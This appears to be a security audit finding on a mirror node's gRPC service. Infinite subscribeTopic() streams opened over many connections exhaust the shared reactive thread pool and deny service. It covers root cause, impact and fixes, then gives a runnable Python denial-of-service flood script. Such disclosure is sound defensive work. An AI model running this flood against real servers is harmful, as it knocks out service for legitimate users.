### Title
Unbounded Concurrent `subscribeTopic()` Calls Exhaust Reactive Scheduler, Causing Server-Wide DoS

### Summary
`TopicMessageServiceImpl.subscribeTopic()` imposes no global cap on concurrent subscriptions. When called with `limit=0` and no `endTime`, each subscription creates an infinite `Flux` that permanently occupies threads on the shared `Schedulers.boundedElastic()` pool. The only server-side guard — `maxConcurrentCallsPerConnection=5` — is trivially bypassed by opening many connections, allowing an unprivileged attacker to exhaust the bounded elastic thread pool and starve all other reactive pipelines on the server.

### Finding Description

**Code path and root cause:**

In `TopicMessageServiceImpl.subscribeTopic()` (lines 59–92), when a client sends `limit=0` and omits `endTime`:

- `filter.hasLimit()` returns `false` because `TopicMessageFilter.hasLimit()` only returns `true` when `limit > 0` — so the `flux.take(limit)` branch at line 83–85 is never entered.
- `pastEndTime()` at line 123–131 returns `Flux.never()` when `filter.getEndTime() == null` (line 124–125), so the `takeUntilOther` termination signal never fires.
- The resulting `Flux` is infinite and never self-terminates.

Each such subscription immediately schedules work on `Schedulers.boundedElastic()` in three places:

1. **`safetyCheck`** (line 67–70): `subscribeOn(Schedulers.boundedElastic())` — schedules the safety-check pipeline on the bounded elastic pool.
2. **`SharedTopicListener.listen()`** (line 25 of `SharedTopicListener.java`): `publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch())` — each subscriber gets a dedicated drain loop on a bounded elastic thread.
3. **`PollingTopicMessageRetriever.retrieve()`** (line 41 of `PollingTopicMessageRetriever.java`): `Schedulers.boundedElastic()` used for historical retrieval scheduling.

`Schedulers.boundedElastic()` is a JVM-wide singleton capped at `10 × Runtime.availableProcessors()` threads (e.g., 40 threads on a 4-core host). With N simultaneous infinite subscriptions, the drain loops and scheduled tasks queue up, saturating the pool.

**Why the existing check fails:**

`GrpcConfiguration.java` line 33 applies `maxConcurrentCallsPerConnection(5)` — this limits calls **per TCP connection**, not globally. There is no `maxConnections` limit configured. An attacker opens C connections and issues 5 calls each, yielding `5×C` concurrent infinite subscriptions with no server-side rejection. The `subscriberCount` `AtomicLong` (lines 48, 89–90) is a Micrometer gauge only — it is never compared against any maximum and never triggers back-pressure or rejection.

**Exploit flow:**

1. Attacker opens C gRPC connections to port 5600 (no authentication required).
2. On each connection, sends 5 concurrent `subscribeTopic` RPCs with `limit=0`, no `consensusEndTime`, and a valid `topicId`.
3. Server creates `5×C` `TopicContext` objects and `5×C` infinite `Flux` pipelines, each calling `publishOn(Schedulers.boundedElastic())`.
4. The bounded elastic pool (≤40 threads on a 4-core host) is saturated by drain loops and scheduled tasks.
5. All other reactive pipelines (other subscribers, health checks, address book queries) that depend on `Schedulers.boundedElastic()` are starved or time out.

### Impact Explanation

Complete denial of service for the gRPC mirror node service. Legitimate HCS topic subscribers receive no messages or connection errors. The impact extends beyond the gRPC module: any Spring reactive component sharing `Schedulers.boundedElastic()` (the JVM-wide singleton) is affected. Recovery requires restarting the process or the attacker disconnecting. This directly disrupts HCS message delivery, a core mirror node function.

### Likelihood Explanation

The attack requires no credentials, no special protocol knowledge beyond standard gRPC, and no prior state. The gRPC port (5600) is publicly exposed. The attacker needs only a gRPC client library and a valid `topicId` (which is public on-chain data). The attack is trivially repeatable and automatable. The per-connection limit of 5 is not a meaningful barrier — opening 200 connections (a trivial task) yields 1000 concurrent infinite subscriptions.

### Recommendation

1. **Add a global concurrent-subscriber cap**: In `subscribeTopic()`, check `subscriberCount.get()` against a configurable `maxSubscribers` property before proceeding; return `RESOURCE_EXHAUSTED` if exceeded.
2. **Enforce a maximum subscription duration**: Require a non-null `endTime` or impose a server-side maximum subscription lifetime (e.g., 24 hours), rejecting requests that omit it.
3. **Add per-IP or per-connection subscription limits**: Track active subscriptions per remote address and reject new ones beyond a threshold.
4. **Add `maxConnectionAge` / `maxConnections` to `GrpcConfiguration`**: Use `NettyServerBuilder.maxConnectionAge()` and `maxConnectionIdle()` to reclaim resources from long-lived connections.
5. **Isolate subscriber schedulers**: Use a separate, bounded `Scheduler` for subscriber drain loops rather than the shared `Schedulers.boundedElastic()` singleton, to prevent cross-component starvation.

### Proof of Concept

import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1  # any valid topic

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(shardNum=TOPIC_SHARD,
                                        realmNum=TOPIC_REALM,
                                        topicNum=TOPIC_NUM),
        # limit=0 (default), no consensusEndTime → infinite subscription
    )
    threads = []
    for _ in range(5):  # maxConcurrentCallsPerConnection = 5
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(request)))
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# Open 200 connections × 5 calls = 1000 infinite subscriptions
pool = [threading.Thread(target=flood_connection, args=(i,)) for i in range(200)]
for t in pool: t.start()
for t in pool: t.join()

    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
